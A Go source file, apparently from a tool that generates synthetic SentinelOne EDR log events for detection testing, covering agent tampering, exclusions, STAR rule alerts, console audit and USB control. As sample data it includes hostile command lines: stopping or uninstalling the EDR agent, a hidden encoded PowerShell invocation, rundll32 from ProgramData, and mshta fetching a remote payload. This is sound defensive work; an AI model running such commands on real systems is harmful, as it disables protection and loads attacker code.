			Group: "Agent health", Name: "Anti-tamper violation",
			Desc:    "Something tried to stop the SentinelOne service, delete its files or unload its driver. Defence evasion, and usually the step before everything else goes quiet. Activity type inferred.",
			EventID: "3510", Channel: "SYSTEM", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{pUser, pS1Endpoint},
		},
		Build: s1AgentEventBuild(3510, "Agent %s tampering attempt blocked", "Agent", "",
			func(c *core.Ctx, host, user string) []string {
				// The binary and the command line are one choice, not two.
				// Picking them apart is how this catalog has produced records
				// naming net.exe running an sc.exe command line.
				attempts := [][2]string{
					{"sc.exe", `sc.exe stop SentinelAgent`},
					{"taskkill.exe", `taskkill.exe /F /IM SentinelAgent.exe`},
					{"net.exe", `net.exe stop "SentinelOne Agent"`},
					{"powershell.exe", `powershell.exe -c Stop-Service SentinelAgent`},
				}
				at := attempts[c.Int(0, len(attempts)-1)]
				return []string{
					s1KV("fileName", at[0]),
					s1KV("filePath", `C:\Windows\System32\`+at[0]),
					s1KV("threatProcessUser", c.Env.NetBIOS+`\`+user),
					s1KV("threatCommandLineArguments", at[1]),
				}
			}, core.SevCrit),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-agent-uninstall-attempt", Source: core.SourceSentinelOne,
			Group: "Agent health", Name: "Agent uninstall attempted",
			Desc:    "An uninstall was attempted on the endpoint. With anti-tamper on it needs the passphrase, so a failed attempt is an attacker probing. Activity type appears in real activity logs but its description is inferred.",
			EventID: "3608", Channel: "SYSTEM", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1562.001", "T1489"},
			Params: []core.Param{pUser, pS1Endpoint},
		},
		Build: s1AgentEventBuild(3608, "Agent %s uninstall attempt was blocked - passphrase required", "Agent", "",
			func(c *core.Ctx, host, user string) []string {
				return []string{
					s1KV("suser", c.Env.NetBIOS+`\`+user),
					s1KV("fileName", "SentinelOneInstaller.exe"),
					s1KV("threatCommandLineArguments",
						`SentinelOneInstaller.exe -c -k "" -t`),
				}
			}, core.SevCrit),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-agent-offline", Source: core.SourceSentinelOne,
			Group: "Agent health", Name: "Agent went offline",
			Desc:    "The console stopped hearing from an agent. One host is attrition; a run of them in one subnet is either a network fault or someone clearing the way. Activity type inferred.",
			EventID: "3602", Channel: "SYSTEM", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{pUser, pS1Endpoint},
		},
		Build: s1AgentEventBuild(3602, "Agent %s is offline", "Mgmt", "disconnected",
			func(c *core.Ctx, host, user string) []string {
				return []string{
					s1KV("oldValue", "connected"),
					s1KV("newValue", "disconnected"),
				}
			}, core.SevWarning),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-agent-decommissioned", Source: core.SourceSentinelOne,
			Group: "Agent health", Name: "Agent decommissioned",
			Desc:    "An agent was decommissioned from the console, which stops it reporting and frees the licence. Legitimate at hardware refresh, hostile in the middle of an incident. Activity type inferred.",
			EventID: "3603", Channel: "SYSTEM", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{pUser, pS1Endpoint},
		},
		Build: s1AgentEventBuild(3603, "Agent %s was decommissioned", "Mgmt", "disconnected",
			func(c *core.Ctx, host, user string) []string {
				return []string{s1KV("suser", c.AdminUser())}
			}, core.SevWarning),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-agent-scan-aborted", Source: core.SourceSentinelOne,
			Group: "Agent health", Name: "Full disk scan aborted",
			Desc:    "A running full disk scan was aborted. Confirmed activity type 91. An abort no analyst asked for deserves a look.",
			EventID: "91", Channel: "SYSTEM", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{pUser, pS1Endpoint},
		},
		Build: s1AgentEventBuild(91, "Agent %s aborted the full disk scan", "Agent", "", nil, core.SevNotice),
	})
}

// ---------------------------------------------------------------------------
// Policy, exclusions and blocklist
// ---------------------------------------------------------------------------

func registerSentinelOnePolicy() {
	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-exclusion-added", Source: core.SourceSentinelOne,
			Group: "Policy and exclusions", Name: "Exclusion added",
			Desc:    "A path, hash or signer was excluded from scanning. The classic way to make an estate blind on purpose: exclude C:\\Users and nothing there is ever detected again. Activity type inferred.",
			EventID: "3001", Channel: "POLICY", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{param("actor", "Console user", "auto"), param("value", "Exclusion value", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			by := c.P("actor", c.AdminUser())
			value := c.P("value", c.Pick(
				`C:\Users\`, `C:\Windows\Temp\`, `\\fileserver\share\tools\`,
				"3b1c74da6992c7c3344877f64b90350cc3d26ba9", `C:\ProgramData\`))
			kind := "Path"
			if len(value) == 40 {
				kind = "Hash"
			}
			a := s1NewAgent(c, c.Env.WinHost, by)
			fields := s1Join(
				[]string{
					s1KV("suser", by),
					s1KV("oldValue", ""),
					s1KV("newValue", value),
				},
				s1Common(c, a, 3001, "The management user "+by+" added a "+kind+" exclusion: "+value, "Mgmt"),
				s1Tail(c, "POLICY", 3001),
			)
			return s1Payload(c, core.SevWarning, s1Record(c, fields))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-blocklist-added", Source: core.SourceSentinelOne,
			Group: "Policy and exclusions", Name: "Blocklist entry added",
			Desc:    "A hash was added to the blocklist so the agent blocks it everywhere in scope. Normal containment, worth recording for the timeline. Activity type inferred.",
			EventID: "3002", Channel: "POLICY", Severity: core.SevLabelMedium,
			Params: []core.Param{param("actor", "Console user", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			by := c.P("actor", c.AdminUser())
			hash := c.HexLower(64)
			a := s1NewAgent(c, c.Env.WinHost, by)
			fields := s1Join(
				[]string{
					s1KV("suser", by),
					s1KV("newValue", hash),
				},
				s1Common(c, a, 3002, "The management user "+by+" added the hash "+hash+" to the blocklist", "Mgmt"),
				s1Tail(c, "POLICY", 3002),
			)
			return s1Payload(c, core.SevNotice, s1Record(c, fields))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-blocklist-removed", Source: core.SourceSentinelOne,
			Group: "Policy and exclusions", Name: "Blocklist entry removed",
			Desc:    "A hash was taken off the blocklist, allowing it to run again. Removal is the direction that matters. Activity type inferred.",
			EventID: "3003", Channel: "POLICY", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{param("actor", "Console user", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			by := c.P("actor", c.AdminUser())
			hash := c.HexLower(64)
			a := s1NewAgent(c, c.Env.WinHost, by)
			fields := s1Join(
				[]string{
					s1KV("suser", by),
					s1KV("oldValue", hash),
					s1KV("newValue", ""),
				},
				s1Common(c, a, 3003, "The management user "+by+" removed the hash "+hash+" from the blocklist", "Mgmt"),
				s1Tail(c, "POLICY", 3003),
			)
			return s1Payload(c, core.SevWarning, s1Record(c, fields))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-policy-mitigation-mode", Source: core.SourceSentinelOne,
			Group: "Policy and exclusions", Name: "Mitigation mode weakened",
			Desc:    "A policy moved from Protect to Detect, so threats are reported but no longer killed or quarantined. Rarely a good sign outside a change window. Activity type inferred.",
			EventID: "3010", Channel: "POLICY", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1562.001"},
			Params: []core.Param{param("actor", "Console user", "auto"), param("scope", "Policy scope", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			by := c.P("actor", c.AdminUser())
			scope := c.P("scope", c.Pick("Default Group", "Servers", "Workstations", "Account "+c.Env.NetBIOS))
			a := s1NewAgent(c, c.Env.WinHost, by)
			fields := s1Join(
				[]string{
					s1KV("suser", by),
					s1KV("oldValue", "protect"),
					s1KV("newValue", "detect"),
				},
				s1Common(c, a, 3010,
					"The management user "+by+" changed the mitigation mode of "+scope+" from Protect to Detect", "Mgmt"),
				s1Tail(c, "POLICY", 3010),
			)
			return s1Payload(c, core.SevCrit, s1Record(c, fields))
		},
	})
}

// ---------------------------------------------------------------------------
// Deep Visibility (STAR custom rules)
// ---------------------------------------------------------------------------

func registerSentinelOneDeepVisibility() {
	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-dv-process-alert", Source: core.SourceSentinelOne,
			Group: "Deep Visibility", Name: "Custom rule alert - process",
			Desc:    "A STAR custom rule matched a Deep Visibility process event. This is how process telemetry reaches syslog: raw Deep Visibility needs Cloud Funnel. Activity type inferred.",
			EventID: "3700", Channel: "STAR", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1059.001", "T1218.011"},
			Params: []core.Param{pUser, pS1Endpoint, param("rule", "Custom rule name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			// Rule name, binary and command line are one choice, not three.
			// A rule called "Encoded PowerShell Command" firing on a
			// rundll32 command line is the kind of record that teaches a
			// detection engineer the wrong thing.
			invocations := []struct{ rule, proc, cmd, parent string }{
				{"Encoded PowerShell Command", "powershell.exe",
					`powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA`, "cmd.exe"},
				{"rundll32 Loading From ProgramData", "rundll32.exe",
					`rundll32.exe C:\ProgramData\svc.dll,DllRegisterServer`, "explorer.exe"},
				{"mshta Fetching Remote Payload", "mshta.exe",
					`mshta.exe http://` + c.ExternalIP() + `/a.hta`, "WINWORD.EXE"},
				{"Office Spawning Script Interpreter", "wscript.exe",
					`wscript.exe C:\Users\Public\update.vbs`, "WINWORD.EXE"},
			}
			inv := invocations[c.Int(0, len(invocations)-1)]
			rule := c.P("rule", inv.rule)
			proc, cmd, parent := inv.proc, inv.cmd, inv.parent

			fields := s1Join(
				[]string{
					s1KV("suser", a.DomainUser),
					s1KV("fileName", proc),
					s1KV("filePath", `C:\Windows\System32\`+proc),
					s1KV("fileHash", c.HexLower(40)),
				},
				s1Common(c, a, 3700, "Custom rule alert: "+rule+" on "+host, "Mgmt"),
				[]string{
					s1KV("ruleName", rule),
					s1KV("ruleId", s1ID(c)),
					s1KV("sourceProcessName", proc),
					s1KV("sourceProcessCommandLine", cmd),
					s1KV("sourceProcessPid", fmt.Sprint(c.PID())),
					s1KV("sourceParentProcessName", parent),
					s1KV("sourceProcessUser", a.DomainUser),
					s1KV("threatStoryline", strings.ToUpper(c.HexLower(16))),
					s1KV("fileHashSha256", c.HexLower(64)),
				},
				s1Tail(c, "STAR", 3700),
			)
			return s1Payload(c, core.SevWarning, s1Record(c, fields))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-dv-network-alert", Source: core.SourceSentinelOne,
			Group: "Deep Visibility", Name: "Custom rule alert - network connection",
			Desc:    "A STAR custom rule matched an outbound connection: beaconing interval, rare destination or a connection from a process that should never make one. Activity type inferred.",
			EventID: "3701", Channel: "STAR", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1071.001", "T1572"},
			Params: []core.Param{pUser, pS1Endpoint, pDstIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			dst := c.P("dstip", c.ExternalIP())
			// Rule, process and port travel together: "Non-Browser Process On
			// 443" has to actually be on 443.
			conns := []struct {
				rule, proc string
				port       int
			}{
				{"Outbound Connection From LOLBin", "rundll32.exe", 8080},
				{"Beacon-Like Interval To Rare Destination", "svchost.exe", 8443},
				{"Non-Browser Process On 443", "notepad.exe", 443},
				{"Reverse Shell Port From Script Host", "powershell.exe", 4444},
			}
			conn := conns[c.Int(0, len(conns)-1)]
			proc, rule, dpt := conn.proc, conn.rule, conn.port

			fields := s1Join(
				[]string{
					s1KV("suser", a.DomainUser),
					s1KV("fileName", proc),
					s1KV("filePath", `C:\Windows\System32\`+proc),
				},
				s1Common(c, a, 3701, "Custom rule alert: "+rule+" on "+host, "Mgmt"),
				[]string{
					s1KV("ruleName", rule),
					s1KV("ruleId", s1ID(c)),
					s1KV("sourceProcessName", proc),
					s1KV("sourceProcessPid", fmt.Sprint(c.PID())),
					s1KV("sourceAddress", a.IP),
					s1KV("sourcePort", fmt.Sprint(c.EphemeralPort())),
					s1KV("destinationAddress", dst),
					s1KV("destinationPort", fmt.Sprint(dpt)),
					s1KV("protocol", "TCP"),
					s1KV("threatStoryline", strings.ToUpper(c.HexLower(16))),
				},
				s1Tail(c, "STAR", 3701),
			)
			return s1Payload(c, core.SevWarning, s1Record(c, fields))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-dv-dns-alert", Source: core.SourceSentinelOne,
			Group: "Deep Visibility", Name: "Custom rule alert - DNS query",
			Desc:    "A STAR custom rule matched a DNS query: a DGA-looking name, a long label suggesting tunnelling, or a known-bad domain. Activity type inferred.",
			EventID: "3702", Channel: "STAR", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1071.004", "T1568.002"},
			Params: []core.Param{pUser, pS1Endpoint, param("domain", "Queried domain", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			domain := c.P("domain", c.Pick(
				c.HexLower(20)+".exfil-dns.net",
				"kj3h4kj2h34kj2h3.xyz",
				"updates."+c.HexLower(12)+".top"))
			proc := c.Pick("powershell.exe", "nslookup.exe", "svchost.exe")

			fields := s1Join(
				[]string{
					s1KV("suser", a.DomainUser),
					s1KV("fileName", proc),
				},
				s1Common(c, a, 3702, "Custom rule alert: Suspicious DNS query on "+host, "Mgmt"),
				[]string{
					s1KV("ruleName", "Suspicious DNS Query"),
					s1KV("ruleId", s1ID(c)),
					s1KV("sourceProcessName", proc),
					s1KV("sourceProcessPid", fmt.Sprint(c.PID())),
					s1KV("dnsRequest", domain),
					s1KV("dnsResponse", c.ExternalIP()),
					s1KV("threatStoryline", strings.ToUpper(c.HexLower(16))),
				},
				s1Tail(c, "STAR", 3702),
			)
			return s1Payload(c, core.SevWarning, s1Record(c, fields))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-dv-cross-process", Source: core.SourceSentinelOne,
			Group: "Deep Visibility", Name: "Custom rule alert - cross-process access",
			Desc:    "A STAR custom rule matched a process opening a handle into another process, the shape of both credential dumping and injection. Activity type inferred.",
			EventID: "3700", Channel: "STAR", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1003.001", "T1055"},
			Params: []core.Param{pUser, pS1Endpoint},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			proc := c.Pick("rundll32.exe", "taskmgr.exe", "procdump64.exe", "werfault.exe")

			fields := s1Join(
				[]string{
					s1KV("suser", a.DomainUser),
					s1KV("fileName", proc),
					s1KV("filePath", `C:\Windows\System32\`+proc),
				},
				s1Common(c, a, 3700, "Custom rule alert: Cross Process Access To LSASS on "+host, "Mgmt"),
				[]string{
					s1KV("ruleName", "Cross Process Access To LSASS"),
					s1KV("ruleId", s1ID(c)),
					s1KV("sourceProcessName", proc),
					s1KV("sourceProcessPid", fmt.Sprint(c.PID())),
					s1KV("targetProcessName", "lsass.exe"),
					s1KV("targetProcessPid", fmt.Sprint(c.Int(600, 900))),
					s1KV("crossProcessDesiredAccess", "0x1010"),
					s1KV("threatStoryline", strings.ToUpper(c.HexLower(16))),
				},
				s1Tail(c, "STAR", 3700),
			)
			return s1Payload(c, core.SevCrit, s1Record(c, fields))
		},
	})
}

// ---------------------------------------------------------------------------
// Console audit
// ---------------------------------------------------------------------------

// s1ConsoleBuild renders a management-console record. These have no endpoint,
// so the agent block carries the console host and the acting user.
func s1ConsoleBuild(eventID int, cat string, sev int,
	desc func(c *core.Ctx, by string) string, lead func(c *core.Ctx, by string) []string) func(*core.Ctx) core.Payload {

	return func(c *core.Ctx) core.Payload {
		by := c.P("actor", c.AdminUser())
		a := s1NewAgent(c, c.Env.WinHost, by)
		var leadFields []string
		if lead != nil {
			leadFields = lead(c, by)
		}
		fields := s1Join(
			leadFields,
			s1Common(c, a, eventID, desc(c, by), "Mgmt"),
			s1Tail(c, cat, eventID),
		)
		return s1Payload(c, sev, s1Record(c, fields))
	}
}

func registerSentinelOneAudit() {
	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-console-login", Source: core.SourceSentinelOne,
			Group: "Console audit", Name: "Console user logged in",
			Desc:    "A management console login. Confirmed activity type 27. A login from an unusual address is the first sign the console itself is the target.",
			EventID: "27", Channel: "USERMANAGEMENT", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1078"},
			Params: []core.Param{param("actor", "Console user", "auto"), pSrcIP},
		},
		Build: s1ConsoleBuild(27, "USERMANAGEMENT", core.SevInfo,
			func(c *core.Ctx, by string) string {
				return "The management user " + by + " logged in to the management console"
			},
			func(c *core.Ctx, by string) []string {
				return []string{
					s1KV("suser", by),
					s1KV("sourceAddress", c.P("srcip", c.ExternalIP())),
				}
			}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-console-login-failed", Source: core.SourceSentinelOne,
			Group: "Console audit", Name: "Console login failed",
			Desc:    "A failed management console login. Repeated failures against an admin account are a direct attack on the EDR estate. Activity type inferred.",
			EventID: "26", Channel: "USERMANAGEMENT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1110"},
			Params: []core.Param{param("actor", "Console user", "auto"), pSrcIP},
		},
		Build: s1ConsoleBuild(26, "USERMANAGEMENT", core.SevWarning,
			func(c *core.Ctx, by string) string {
				return "Login attempt failed for the management user " + by
			},
			func(c *core.Ctx, by string) []string {
				return []string{
					s1KV("suser", by),
					s1KV("sourceAddress", c.P("srcip", c.ExternalIP())),
					s1KV("newValue", "Invalid credentials"),
				}
			}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-console-user-created", Source: core.SourceSentinelOne,
			Group: "Console audit", Name: "Console user created",
			Desc:    "A new management user was created, with a role. A fresh Admin account nobody asked for is persistence in the security tool itself. Activity type inferred.",
			EventID: "24", Channel: "USERMANAGEMENT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1136.003"},
			Params: []core.Param{param("actor", "Console user", "auto"), pUser},
		},
		Build: s1ConsoleBuild(24, "USERMANAGEMENT", core.SevWarning,
			func(c *core.Ctx, by string) string {
				return "The management user " + by + " created the user " +
					c.P("user", "svc-integration") + " with the role Admin"
			},
			func(c *core.Ctx, by string) []string {
				return []string{
					s1KV("suser", by),
					s1KV("newValue", "Admin"),
				}
			}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-console-user-deleted", Source: core.SourceSentinelOne,
			Group: "Console audit", Name: "Console user deleted",
			Desc:    "A management user was removed. Confirmed activity type 25. Deleting the account that raised the alarm is a recognised cleanup step.",
			EventID: "25", Channel: "USERMANAGEMENT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1070"},
			Params: []core.Param{param("actor", "Console user", "auto"), pUser},
		},
		Build: s1ConsoleBuild(25, "USERMANAGEMENT", core.SevWarning,
			func(c *core.Ctx, by string) string {
				return "The management user " + by + " deleted the user " + c.P("user", c.User())
			},
			func(c *core.Ctx, by string) []string {
				return []string{s1KV("suser", by)}
			}),
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-api-token-generated", Source: core.SourceSentinelOne,
			Group: "Console audit", Name: "API token generated",
			Desc:    "A console API token was issued. A token is a long-lived credential to the whole estate, including the uninstall and decommission endpoints. Activity type inferred.",
			EventID: "1002", Channel: "USERMANAGEMENT", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1098.001"},
			Params: []core.Param{param("actor", "Console user", "auto")},
		},
		Build: s1ConsoleBuild(1002, "USERMANAGEMENT", core.SevWarning,
			func(c *core.Ctx, by string) string {
				return "The management user " + by + " generated an API token"
			},
			func(c *core.Ctx, by string) []string {
				return []string{
					s1KV("suser", by),
					s1KV("sourceAddress", c.ExternalIP()),
				}
			}),
	})
}

// ---------------------------------------------------------------------------
// Device control
// ---------------------------------------------------------------------------

func registerSentinelOneDeviceControl() {
	// The eventDesc wording here is quoted from a real capture.
	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-devicecontrol-usb-connected", Source: core.SourceSentinelOne,
			Group: "Device control", Name: "USB device connected",
			Desc:    "Device Control allowed a USB device. Confirmed activity type 5126, with the vendor's own description wording.",
			EventID: "5126", Channel: "DEVICECONTROL", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1091", "T1052.001"},
			Params: []core.Param{pUser, pS1Endpoint, param("device", "Device description", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			device := c.P("device", c.Pick(
				"Microsoft Microsoft® LifeCam HD-3000",
				"SanDisk Cruzer Blade",
				"Kingston DataTraveler 3.0",
				"Seagate Backup Plus Portable"))

			fields := s1Join(
				[]string{s1KV("suser", a.DomainUser)},
				s1Common(c, a, 5126,
					"SentinelOne: Device Control connected USB "+device+" on "+host+" ("+user+")", "Agent"),
				[]string{
					s1KV("endpointDeviceControlRuleId", s1ID(c)),
					s1KV("deviceType", "USB"),
					s1KV("deviceVendorName", strings.SplitN(device, " ", 2)[0]),
					s1KV("deviceSerial", strings.ToUpper(c.HexLower(16))),
				},
				s1Tail(c, "DEVICECONTROL", 5126),
			)
			return s1Payload(c, core.SevNotice, s1Record(c, fields))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "sentinelone-devicecontrol-blocked", Source: core.SourceSentinelOne,
			Group: "Device control", Name: "USB device blocked",
			Desc:    "Device Control blocked a mass storage device. A run of these on one host is someone trying every stick they own. Activity type inferred.",
			EventID: "5127", Channel: "DEVICECONTROL", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1052.001", "T1200"},
			Params: []core.Param{pUser, pS1Endpoint, param("device", "Device description", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			host := c.P("host", c.Workstation())
			user := c.P("user", c.User())
			a := s1NewAgent(c, host, user)
			device := c.P("device", c.Pick(
				"SanDisk Cruzer Blade",
				"Generic USB Mass Storage",
				"Kingston DataTraveler 3.0"))

			fields := s1Join(
				[]string{s1KV("suser", a.DomainUser)},
				s1Common(c, a, 5127,
					"SentinelOne: Device Control blocked USB "+device+" on "+host+" ("+user+")", "Agent"),
				[]string{
					s1KV("endpointDeviceControlRuleId", s1ID(c)),
					s1KV("deviceType", "USB"),
					s1KV("deviceVendorName", strings.SplitN(device, " ", 2)[0]),
					s1KV("deviceSerial", strings.ToUpper(c.HexLower(16))),
					s1KV("newValue", "Blocked"),
				},
				s1Tail(c, "DEVICECONTROL", 5127),
			)
			return s1Payload(c, core.SevWarning, s1Record(c, fields))
		},
	})
}
